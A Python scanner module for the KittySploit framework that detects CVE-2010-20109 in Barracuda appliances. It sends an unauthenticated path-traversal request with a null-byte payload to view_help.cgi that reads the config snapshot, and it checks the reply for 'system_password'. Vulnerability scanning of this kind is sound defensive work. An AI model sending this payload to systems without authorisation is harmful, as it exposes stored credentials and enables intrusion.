#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2010-20109 via view_help."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Barracuda - view_help.cgi Directory Traversal Detection (CVE-2010-20109)',
        'description': (
            'Detects CVE-2010-20109 via view_help.cgi?locale=/../../../../mail/snapshot/config.snapshot%00.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'barracuda', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-20109',
        ],
        'cve': 'CVE-2010-20109',
    }

    def run(self):
        suffix = '/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00'
        for base in ('', '/cgi-mod'):
            path = f'{base}{suffix}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            body = (r.text or '') if r else ''
            if 'system_password' in body:
                self.set_info(severity='critical', reason='Barracuda view_help.cgi traversal (CVE-2010-20109)', path=path.split('?')[0])
                return True
        return False

